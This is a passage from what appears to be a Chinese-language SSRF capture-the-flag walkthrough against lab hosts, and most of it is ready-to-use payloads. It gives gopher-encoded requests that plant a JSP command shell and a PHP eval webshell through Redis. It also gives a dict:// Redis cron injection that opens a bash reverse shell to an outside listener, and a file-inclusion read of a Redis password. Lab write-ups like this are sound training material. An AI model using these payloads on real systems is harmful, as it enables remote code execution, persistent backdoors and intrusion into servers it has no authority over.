3d%69%6e%2e%72%65%61%64%28%62%29%29%21%3d%2d%31%29%0d%0a%20%20%20%20%20%20%20%20%7b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%75%74%2e%70%72%69%6e%74%6c%6e%28%6e%65%77%20%53%74%72%69%6e%67%28%62%29%29%3b%0d%0a%20%20%20%20%20%20%20%20%7d%0d%0a%20%20%20%20%20%20%20%20%6f%75%74%2e%70%72%69%6e%74%28%22%3c%2f%70%72%65%3e%22%29%3b%0d%0a%20%20%20%20%7d%20%65%6c%73%65%20%7b%0d%0a%20%20%20%20%20%20%20%20%6f%75%74%2e%70%72%69%6e%74%28%22%66%6f%72%6d%61%74%3a%20%78%78%78%2e%6a%73%70%3f%63%6d%64%3d%43%6f%6d%6d%61%6e%64%22%29%3b%0d%0a%20%20%20%20%7d%0d%0a%25%3e
```

![image-20240905145229820](https://image.201068.xyz/assets/29.SSRF/image-20240905145229820.png)

##### burp请求

```
gopher%3A%2F%2F172.72.23.26%3A8080%2F_%25%35%30%25%35%35%25%35%34%25%32%30%25%32%66%25%37%38%25%37%38%25%37%38%25%32%65%25%36%61%25%37%33%25%37%30%25%32%66%25%32%30%25%34%38%25%35%34%25%35%34%25%35%30%25%32%66%25%33%31%25%32%65%25%33%31%25%30%64%25%30%61%25%34%38%25%36%66%25%37%33%25%37%34%25%33%61%25%32%30%25%33%31%25%33%37%25%33%32%25%32%65%25%33%37%25%33%32%25%32%65%25%33%32%25%33%33%25%32%65%25%33%32%25%33%36%25%33%61%25%33%38%25%33%30%25%33%38%25%33%30%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%63%25%36%35%25%36%65%25%36%37%25%37%34%25%36%38%25%33%61%25%32%30%25%33%34%25%33%36%25%33%30%25%30%64%25%30%61%25%30%64%25%30%61%25%33%63%25%32%35%25%30%64%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%35%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%30%25%36%33%25%36%66%25%36%64%25%36%64%25%36%31%25%36%65%25%36%34%25%32%30%25%33%64%25%32%30%25%37%32%25%36%35%25%37%31%25%37%35%25%36%35%25%37%33%25%37%34%25%32%65%25%36%37%25%36%35%25%37%34%25%35%30%25%36%31%25%37%32%25%36%31%25%36%64%25%36%35%25%37%34%25%36%35%25%37%32%25%32%38%25%32%32%25%36%33%25%36%64%25%36%34%25%32%32%25%32%39%25%33%62%25%30%64%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%36%39%25%36%36%25%32%38%25%36%33%25%36%66%25%36%64%25%36%64%25%36%31%25%36%65%25%36%34%25%32%30%25%32%31%25%33%64%25%32%30%25%36%65%25%37%35%25%36%63%25%36%63%25%32%39%25%30%64%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%37%62%25%30%64%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%36%61%25%36%31%25%37%36%25%36%31%25%32%65%25%36%39%25%36%66%25%32%65%25%34%39%25%36%65%25%37%30%25%37%35%25%37%34%25%35%33%25%37%34%25%37%32%25%36%35%25%36%31%25%36%64%25%32%30%25%36%39%25%36%65%25%33%64%25%35%32%25%37%35%25%36%65%25%37%34%25%36%39%25%36%64%25%36%35%25%32%65%25%36%37%25%36%35%25%37%34%25%35%32%25%37%35%25%36%65%25%37%34%25%36%39%25%36%64%25%36%35%25%32%38%25%32%39%25%32%65%25%36%35%25%37%38%25%36%35%25%36%33%25%32%38%25%36%33%25%36%66%25%36%64%25%36%64%25%36%31%25%36%65%25%36%34%25%32%39%25%32%65%25%36%37%25%36%35%25%37%34%25%34%39%25%36%65%25%37%30%25%37%35%25%37%34%25%35%33%25%37%34%25%37%32%25%36%35%25%36%31%25%36%64%25%32%38%25%32%39%25%33%62%25%30%64%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%36%39%25%36%65%25%37%34%25%32%30%25%36%31%25%32%30%25%33%64%25%32%30%25%32%64%25%33%31%25%33%62%25%30%64%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%36%32%25%37%39%25%37%34%25%36%35%25%35%62%25%35%64%25%32%30%25%36%32%25%32%30%25%33%64%25%32%30%25%36%65%25%36%35%25%37%37%25%32%30%25%36%32%25%37%39%25%37%34%25%36%35%25%35%62%25%33%32%25%33%30%25%33%34%25%33%38%25%35%64%25%33%62%25%30%64%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%36%66%25%37%35%25%37%34%25%32%65%25%37%30%25%37%32%25%36%39%25%36%65%25%37%34%25%32%38%25%32%32%25%33%63%25%37%30%25%37%32%25%36%35%25%33%65%25%32%32%25%32%39%25%33%62%25%30%64%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%37%37%25%36%38%25%36%39%25%36%63%25%36%35%25%32%38%25%32%38%25%36%31%25%33%64%25%36%39%25%36%65%25%32%65%25%37%32%25%36%35%25%36%31%25%36%34%25%32%38%25%36%32%25%32%39%25%32%39%25%32%31%25%33%64%25%32%64%25%33%31%25%32%39%25%30%64%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%37%62%25%30%64%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%36%66%25%37%35%25%37%34%25%32%65%25%37%30%25%37%32%25%36%39%25%36%65%25%37%34%25%36%63%25%36%65%25%32%38%25%36%65%25%36%35%25%37%37%25%32%30%25%35%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%38%25%36%32%25%32%39%25%32%39%25%33%62%25%30%64%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%37%64%25%30%64%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%36%66%25%37%35%25%37%34%25%32%65%25%37%30%25%37%32%25%36%39%25%36%65%25%37%34%25%32%38%25%32%32%25%33%63%25%32%66%25%37%30%25%37%32%25%36%35%25%33%65%25%32%32%25%32%39%25%33%62%25%30%64%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%37%64%25%32%30%25%36%35%25%36%63%25%37%33%25%36%35%25%32%30%25%37%62%25%30%64%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%36%66%25%37%35%25%37%34%25%32%65%25%37%30%25%37%32%25%36%39%25%36%65%25%37%34%25%32%38%25%32%32%25%36%36%25%36%66%25%37%32%25%36%64%25%36%31%25%37%34%25%33%61%25%32%30%25%37%38%25%37%38%25%37%38%25%32%65%25%36%61%25%37%33%25%37%30%25%33%66%25%36%33%25%36%64%25%36%34%25%33%64%25%34%33%25%36%66%25%36%64%25%36%64%25%36%31%25%36%65%25%36%34%25%32%32%25%32%39%25%33%62%25%30%64%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%37%64%25%30%64%25%30%61%25%32%35%25%33%65
```

![image-20240905150022357](https://image.201068.xyz/assets/29.SSRF/image-20240905150022357.png)

#### 命令执行

```
http://172.72.23.26:8080/xxx.jsp?cmd=cat%20/flag
```

![image-20240905145344548](https://image.201068.xyz/assets/29.SSRF/image-20240905145344548.png)

#### flag9

```
flag{nisp9_thelastone?_flag9}
```

### 172.72.23.27:6379

#### Redis未授权登录

```
dict://172.72.23.27:6379
```

![image-20240905153632391](https://image.201068.xyz/assets/29.SSRF/image-20240905153632391.png)

##### redis信息

```
dict://172.72.23.27:6379/info
```

![image-20240905154659739](https://image.201068.xyz/assets/29.SSRF/image-20240905154659739.png)

##### 查看所有key

```
dict://172.72.23.27:6379/keys *
```

![image-20240905154726203](https://image.201068.xyz/assets/29.SSRF/image-20240905154726203.png)

##### 查看redis里的flag

```
dict://172.72.23.27:6379/get flag
```

![image-20240905154814714](https://image.201068.xyz/assets/29.SSRF/image-20240905154814714.png)

#### flag2

```
flag{nisp2_flag2_is_here}
```

#### Redis未授权 反弹链接

##### 攻击机kali监听

```
nc -lnvp 1234
```

##### redis配置

```bash
#dict://172.72.23.27:6379/flushall

dict://172.72.23.27:6379/config set dir /var/spool/cron/
dict://172.72.23.27:6379/config set dbfilename root
dict://172.72.23.27:6379/set x "\n* * * * * /bin/bash -i >& /dev/tcp/192.168.70.4/1234 0>&1\n"
dict://172.72.23.27:6379/save
```

![image-20240905160318018](https://image.201068.xyz/assets/29.SSRF/image-20240905160318018.png)

![image-20240905160345874](https://image.201068.xyz/assets/29.SSRF/image-20240905160345874.png)

![image-20240905161148575](https://image.201068.xyz/assets/29.SSRF/image-20240905161148575.png)

![image-20240905160507931](https://image.201068.xyz/assets/29.SSRF/image-20240905160507931.png)

##### 攻击机监听结果

```bash
cat /flag
```

![image-20240905161346262](https://image.201068.xyz/assets/29.SSRF/image-20240905161346262.png)

#### flag3

```
flag{nisp3_verygood_flag3}
```

### 172.72.23.28:6379

#### Redis 有认证

```
dict://172.72.23.28:6379/info
```

![image-20240905161904251](https://image.201068.xyz/assets/29.SSRF/image-20240905161904251.png)

#### 文件包含

```
http://172.72.23.28
```

![image-20240905161957352](https://image.201068.xyz/assets/29.SSRF/image-20240905161957352.png)

##### 查看redis的配置文件

```
http://172.72.23.28/?file=file:///etc/redis.conf
```

![image-20240905162313016](https://image.201068.xyz/assets/29.SSRF/image-20240905162313016.png)

> P@ssw0rd

#### socat

```bash
socat -v tcp-listen:4444,fork tcp-connect:127.0.0.1:6379
```

```python
redis-cli -h 127.0.0.1 -p 4444
```

#### 查看flag

```
*2
$4
AUTH
$8
P@ssw0rd
*2
$4
keys
$1
*
*2
$3
get
$4
flag
*1
$4
quit
```

![image-20240905172847587](https://image.201068.xyz/assets/29.SSRF/image-20240905172847587.png)

##### 编码一次

```
%2a%32%0d%0a%24%34%0d%0a%41%55%54%48%0d%0a%24%38%0d%0a%50%40%73%73%77%30%72%64%0d%0a%2a%32%0d%0a%24%34%0d%0a%6b%65%79%73%0d%0a%24%31%0d%0a%2a%0d%0a%2a%32%0d%0a%24%33%0d%0a%67%65%74%0d%0a%24%34%0d%0a%66%6c%61%67%0d%0a%2a%31%0d%0a%24%34%0d%0a%71%75%69%74
```

![image-20240905173211410](https://image.201068.xyz/assets/29.SSRF/image-20240905173211410.png)

##### 编码二次

```
%25%32%61%25%33%32%25%30%64%25%30%61%25%32%34%25%33%34%25%30%64%25%30%61%25%34%31%25%35%35%25%35%34%25%34%38%25%30%64%25%30%61%25%32%34%25%33%38%25%30%64%25%30%61%25%35%30%25%34%30%25%37%33%25%37%33%25%37%37%25%33%30%25%37%32%25%36%34%25%30%64%25%30%61%25%32%61%25%33%32%25%30%64%25%30%61%25%32%34%25%33%34%25%30%64%25%30%61%25%36%62%25%36%35%25%37%39%25%37%33%25%30%64%25%30%61%25%32%34%25%33%31%25%30%64%25%30%61%25%32%61%25%30%64%25%30%61%25%32%61%25%33%32%25%30%64%25%30%61%25%32%34%25%33%33%25%30%64%25%30%61%25%36%37%25%36%35%25%37%34%25%30%64%25%30%61%25%32%34%25%33%34%25%30%64%25%30%61%25%36%36%25%36%63%25%36%31%25%36%37%25%30%64%25%30%61%25%32%61%25%33%31%25%30%64%25%30%61%25%32%34%25%33%34%25%30%64%25%30%61%25%37%31%25%37%35%25%36%39%25%37%34
```

##### gopher请求

###### 网页请求

```
gopher://172.72.23.28:6379/_%2a%32%0d%0a%24%34%0d%0a%41%55%54%48%0d%0a%24%38%0d%0a%50%40%73%73%77%30%72%64%0d%0a%2a%32%0d%0a%24%34%0d%0a%6b%65%79%73%0d%0a%24%31%0d%0a%2a%0d%0a%2a%32%0d%0a%24%33%0d%0a%67%65%74%0d%0a%24%34%0d%0a%66%6c%61%67%0d%0a%2a%31%0d%0a%24%34%0d%0a%71%75%69%74
```

![image-20240905185025585](https://image.201068.xyz/assets/29.SSRF/image-20240905185025585.png)

###### burp请求

```
gopher%3A%2F%2F172.72.23.28%3A6379%2F_%25%32%61%25%33%32%25%30%64%25%30%61%25%32%34%25%33%34%25%30%64%25%30%61%25%34%31%25%35%35%25%35%34%25%34%38%25%30%64%25%30%61%25%32%34%25%33%38%25%30%64%25%30%61%25%35%30%25%34%30%25%37%33%25%37%33%25%37%37%25%33%30%25%37%32%25%36%34%25%30%64%25%30%61%25%32%61%25%33%32%25%30%64%25%30%61%25%32%34%25%33%34%25%30%64%25%30%61%25%36%62%25%36%35%25%37%39%25%37%33%25%30%64%25%30%61%25%32%34%25%33%31%25%30%64%25%30%61%25%32%61%25%30%64%25%30%61%25%32%61%25%33%32%25%30%64%25%30%61%25%32%34%25%33%33%25%30%64%25%30%61%25%36%37%25%36%35%25%37%34%25%30%64%25%30%61%25%32%34%25%33%34%25%30%64%25%30%61%25%36%36%25%36%63%25%36%31%25%36%37%25%30%64%25%30%61%25%32%61%25%33%31%25%30%64%25%30%61%25%32%34%25%33%34%25%30%64%25%30%61%25%37%31%25%37%35%25%36%39%25%37%34
```

![image-20240905185931820](https://image.201068.xyz/assets/29.SSRF/image-20240905185931820.png)

#### flag10

```
flag{nisp10_The_ninth_flag10}
```



#### 写入webshell

```
*2
$4
AUTH
$8
P@ssw0rd
*1
$8
flushall
*3
$3
set
$1
x
$27


<?php eval($_GET[1]);?>


*4
$6
config
$3
set
$3
dir
$13
/var/www/html
*4
$6
config
$3
set
$10
dbfilename
$10
shell1.php
*1
$4
save
*1
$4
quit

```

##### url编码一次

```
%2a%32%0d%0a%24%34%0d%0a%41%55%54%48%0d%0a%24%38%0d%0a%50%40%73%73%77%30%72%64%0d%0a%2a%31%0d%0a%24%38%0d%0a%66%6c%75%73%68%61%6c%6c%0d%0a%2a%33%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%31%0d%0a%78%0d%0a%24%32%37%0d%0a%0a%0a%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%47%45%54%5b%31%5d%29%3b%3f%3e%0a%0a%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%33%0d%0a%64%69%72%0d%0a%24%31%33%0d%0a%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%31%30%0d%0a%64%62%66%69%6c%65%6e%61%6d%65%0d%0a%24%31%30%0d%0a%73%68%65%6c%6c%31%2e%70%68%70%0d%0a%2a%31%0d%0a%24%34%0d%0a%73%61%76%65%0d%0a%2a%31%0d%0a%24%34%0d%0a%71%75%69%74%0d%0a
```

##### url编码二次

```
%252A2%250D%250A%25244%250D%250AAUTH%250D%250A%25248%250D%250AP%2540ssw0rd%250D%250A%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250Ax%250D%250A%252427%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524%255FGET%255B1%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%252410%250D%250Ashell1.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%252A1%250D%250A%25244%250D%250Aquit%250D%250A
```

##### 网页请求

```
gopher://172.72.23.28:6379/_%2a%32%0d%0a%24%34%0d%0a%41%55%54%48%0d%0a%24%38%0d%0a%50%40%73%73%77%30%72%64%0d%0a%2a%31%0d%0a%24%38%0d%0a%66%6c%75%73%68%61%6c%6c%0d%0a%2a%33%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%31%0d%0a%78%0d%0a%24%32%37%0d%0a%0a%0a%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%47%45%54%5b%31%5d%29%3b%3f%3e%0a%0a%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%33%0d%0a%64%69%72%0d%0a%24%31%33%0d%0a%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%31%30%0d%0a%64%62%66%69%6c%65%6e%61%6d%65%0d%0a%24%31%30%0d%0a%73%68%65%6c%6c%31%2e%70%68%70%0d%0a%2a%31%0d%0a%24%34%0d%0a%73%61%76%65%0d%0a%2a%31%0d%0a%24%34%0d%0a%71%75%69%74%0d%0a
```

![image-20240905172302618](https://image.201068.xyz/assets/29.SSRF/image-20240905172302618.png)

##### burp请求

```
gopher%3A%2F%2F172.72.23.28%3A6379%2F_%252A2%250D%250A%25244%250D%250AAUTH%250D%250A%25248%250D%250AP%2540ssw0rd%250D%250A%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250Ax%250D%250A%252427%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524%255FGET%255B1%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%252410%250D%250Ashell1.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%252A1%250D%250A%25244%250D%250Aquit%250D%250A
```

![image-20240905191615361](https://image.201068.xyz/assets/29.SSRF/image-20240905191615361.png)

#### 命令执行

> echo file_get_contents('/etc/hosts');

```php
http://172.72.23.28/shell1.php?1=echo%20file%5fget%5fcontents('/etc/hosts');
```

![image-20240905195215049](https://image.201068.xyz/assets/29.SSRF/image-20240905195215049.png)
